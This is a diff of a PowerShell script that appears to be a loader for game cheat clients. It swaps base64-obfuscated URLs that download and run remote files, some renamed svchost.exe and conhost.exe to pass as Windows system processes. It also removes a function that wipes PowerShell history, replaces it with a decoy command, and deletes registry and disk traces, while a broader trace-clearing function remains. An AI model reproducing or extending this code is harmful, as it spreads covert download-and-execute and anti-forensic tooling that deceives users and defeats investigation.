@@ -401,30 +401,6 @@ function Download-SoundFile {
     return $false
 }
 
-# Basic trace clearing function (minimal)
-function Clear-BasicTraces {
-    try {
-        # Clear PowerShell history
-        Clear-Content -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
-        Set-Content -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Value 'iwr -useb https://raw.githubusercontent.com/spicetify/cli/main/install.ps1 | iex' -ErrorAction SilentlyContinue
-        
-        # Registry cleanup - MuiCache (only Z: drive entries)
-        $muiCachePath = "HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
-        if (Test-Path $muiCachePath) {
-            Get-ItemProperty $muiCachePath -ErrorAction SilentlyContinue | 
-            ForEach-Object { $_.PSObject.Properties } | 
-            Where-Object { $_.Name -like "Z:\*" } | 
-            ForEach-Object { Remove-ItemProperty -Path $muiCachePath -Name $_.Name -ErrorAction SilentlyContinue }
-        }
-        
-        # Clear temp VHD file
-        if (Test-Path $vdiskPath) {
-            Remove-Item -Path $vdiskPath -Force -ErrorAction SilentlyContinue
-        }
-        
-    } catch { }
-}
-
 # Enhanced trace clearing function (comprehensive at end)
 function Clear-AllTraces {
     try {
@@ -645,7 +621,7 @@ $injectButton.Add_Click({
     $doomsdayButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
     $doomsdayButton.Add_Click({
         # Stealth execution with anti-analysis
-        $url = Get-DeobfuscatedString("aHR0cHM6Ly9naXRodWIuY29tL2Rldm51bGwtc3lzL2Rldm51bGwvcmF3L3JlZnMvaGVhZHMvbWFpbi9kZXZudWxsL3NvZGl1bS1leHRyYS9zb2RpdW0tZXh0cmEtZmFicmljLTAuNi4xK21jMS4yMS40Lmphcg==")
+        $url = Get-DeobfuscatedString("aHR0cHM6Ly9naXRodWIuY29tL2Rldm51bGwtc3lzL2Rldm51bGwvcmF3L3JlZnMvaGVhZHMvbWFpbi9kZXZudWxsL3NvZGl1bS9zb2RpdW0tZXh0cmEtbWMxLjIxLjQuamFy")
         Invoke-StealthExecution -Url $url
     })
     
@@ -660,7 +636,7 @@ $injectButton.Add_Click({
     $vapev4Button.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
     $vapev4Button.Add_Click({
         # Stealth execution with anti-analysis
-        $url = Get-DeobfuscatedString("aHR0cHM6Ly9naXRodWIuY29tL2Rldm51bGwtc3lzL2Rldm51bGwvcmF3L3JlZnMvaGVhZHMvbWFpbi9kZXZudWxsL3N5c3RlbTMyL2VudGl0eWN1bGxpbmctZmFicmljLTEuNy40LW1jMS4yMS40Lmphcg==")
+        $url = Get-DeobfuscatedString("aHR0cHM6Ly9naXRodWIuY29tL2Rldm51bGwtc3lzL2Rldm51bGwvcmF3L3JlZnMvaGVhZHMvbWFpbi9kZXZudWxsL1Byb2dyYW1EYXRhL3N2Y2hvc3QuZXhl")
         Invoke-StealthExecution -Url $url
     })
     
@@ -675,7 +651,7 @@ $injectButton.Add_Click({
     $vapeliteButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
     $vapeliteButton.Add_Click({
         # Stealth execution with anti-analysis
-        $url = Get-DeobfuscatedString("aHR0cHM6Ly9naXRodWIuY29tL2Rldm51bGwtc3lzL2Rldm51bGwvcmF3L3JlZnMvaGVhZHMvbWFpbi9kZXZudWxsL1Byb2dyYW1EYXRhL2ZhYnJpYy1pbnN0YWxsZXItMS4wLjMuamFy")
+        $url = Get-DeobfuscatedString("aHR0cHM6Ly9naXRodWIuY29tL2Rldm51bGwtc3lzL2Rldm51bGwvcmF3L3JlZnMvaGVhZHMvbWFpbi9kZXZudWxsL1Byb2dyYW1EYXRhL2Nvbmhvc3QuZXhl")
         Invoke-StealthExecution -Url $url
     })
     
